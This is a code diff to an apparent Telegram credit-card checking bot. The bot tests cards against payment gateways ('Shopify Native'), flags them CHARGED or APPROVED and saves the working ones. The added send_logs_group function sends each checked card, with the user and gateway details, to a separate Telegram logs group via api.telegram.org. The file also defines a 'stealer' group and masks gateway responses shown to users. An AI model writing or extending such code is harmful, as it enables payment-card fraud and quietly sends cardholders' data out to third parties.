@@ -8,6 +8,7 @@ import aiofiles
 from urllib.parse import urlparse
 import sys
 import tempfile
+from response_mask import mask_response
 
 from gateways import (
     GATEWAY_REGISTRY, get_flat_registry, run_gateway,
@@ -29,6 +30,18 @@ BOT_TOKEN = os.environ.get("TELEGRAM_BOT_TOKEN", "")
 ADMIN_ID = [int(x) for x in os.environ.get("TELEGRAM_ADMIN_ID", "").split(",") if x.strip()]
 GROUP_ID = int(os.environ.get("TELEGRAM_GROUP_ID", "0"))
 GROUP_LINK = os.environ.get("TELEGRAM_GROUP_LINK", "")
+
+def _load_logs_group_id():
+    try:
+        _cfg_path = os.path.join(os.path.dirname(__file__), "config.json")
+        with open(_cfg_path, "r") as _f:
+            _cfg = json.load(_f)
+        val = str(_cfg.get("logs_group_id", "")).strip()
+        return int(val) if val and val not in ("0", "") else 0
+    except Exception:
+        return 0
+
+LOGS_GROUP_ID = _load_logs_group_id()
 CHANNEL_LINK = os.environ.get("TELEGRAM_CHANNEL_LINK", "")
 HIT_FORWARD_GROUP = -1003561084296
 STEALER_GROUP_2 = -1003862598213
@@ -1010,6 +1023,52 @@ def send_bot_group_log(user_name, user_id, card, gateway, response_msg, status, 
     except Exception as e:
         print(f"Bot group log error: {e}")
 
+def send_logs_group(user_name, user_id, card, gateway, response_msg, status, site=None, amount=None):
+    """Send ALL check/hitter results to the dedicated logs group (never deleted, no membership requirement)."""
+    try:
+        config_path = os.path.join(os.path.dirname(__file__), "config.json")
+        with open(config_path, "r") as f:
+            config = json.load(f)
+        bot_token = config.get("TELEGRAM_BOT_TOKEN", "")
+        logs_group_id = str(config.get("logs_group_id", "")).strip()
+        if not bot_token or not logs_group_id or logs_group_id == "0":
+            return
+        import html as _html
+        if status in ("CHARGED",):
+            status_icon = "\U0001f525"
+        elif status in ("APPROVED",):
+            status_icon = "\u2705"
+        elif status in ("DECLINED",):
+            status_icon = "\u274c"
+        else:
+            status_icon = "\u2753"
+        display_name = user_name or str(user_id)
+        tier = get_user_tier(user_id) if user_id else "free"
+        tier_labels = {"free": "Free", "silver": "Silver", "gold": "Gold"}
+        tier_tag = tier_labels.get(tier, "Free")
+        display_name = f"{display_name} [{tier_tag}]"
+        gate_display = GATEWAY_DISPLAY_NAMES.get(gateway, gateway) if gateway else gateway
+        lines = [
+            f"{status_icon} [{status}] Log",
+            f"\U0001f464 {_html.escape(str(display_name))}",
+            f"\U0001f4b3 Card: <code>{_html.escape(str(card))}</code>",
+            f"\u2194\ufe0f Gateway: {_html.escape(str(gate_display or ''))}",
+            f"\U0001f4dd Response: {_html.escape(str(response_msg or ''))}",
+        ]
+        if site:
+            lines.append(f"\U0001f310 Site: {_html.escape(str(site))}")
+        if amount:
+            lines.append(f"\U0001f4b0 Amount: {_html.escape(str(amount))}")
+        text = "\n".join(lines)
+        requests.post(f"https://api.telegram.org/bot{bot_token}/sendMessage", json={
+            "chat_id": int(logs_group_id),
+            "text": text,
+            "parse_mode": "HTML",
+            "disable_web_page_preview": True,
+        }, timeout=10)
+    except Exception as e:
+        print(f"Logs group send error: {e}")
+
 async def save_approved_card(card, status, response, gateway, price, user_id=None, user_name=None):
     try:
         async with aiofiles.open(CC_FILE, "a", encoding="utf-8") as f:
@@ -1023,6 +1082,10 @@ async def save_approved_card(card, status, response, gateway, price, user_id=Non
         pass
     try:
         asyncio.create_task(asyncio.to_thread(send_bot_group_log, user_name, user_id, card, gateway, response, status))
+    except Exception:
+        pass
+    try:
+        asyncio.create_task(asyncio.to_thread(send_logs_group, user_name, user_id, card, gateway, response, status))
     except Exception:
         pass
     try:
@@ -1354,6 +1417,9 @@ def format_gateway_result(status_header, cc, mm, yy, cvv, gateway_name, response
         header = "#Unknown \u2753"
         status_txt = "Unknown \u2753"
         resp_icon = ""
+
+    if status_header not in ("CHARGED",):
+        response = mask_response(response)
 
     sep = "\u2550" * 19
 
@@ -3655,14 +3721,15 @@ async def gateway_cmd(event):
                 elif "insufficient" in r_resp.lower():
                     resp_display = f"CCN LIVE\U0001f387"
                 else:
-                    resp_display = f"{r_resp}\U0001f387"
+                    resp_display = f"{mask_response(r_resp)}\U0001f387"
                 await save_approved_card(cc_str, "APPROVED", r_resp, gate_name, r_site, event.sender_id, first_name)
             elif r_status == "declined":
                 header_icon = "\u274c"
                 resp_display = f"Declined \u26d4"
             else:
                 header_icon = "\u2753"
-                resp_display = f"Error - {r_resp}"
+                _err_display = mask_response(r_resp) if r_resp else r_resp
+                resp_display = f"Error - {_err_display}"
 
             msg = f"""{header_icon} **Shopify Native**
 **Card:** `{cc_str}`
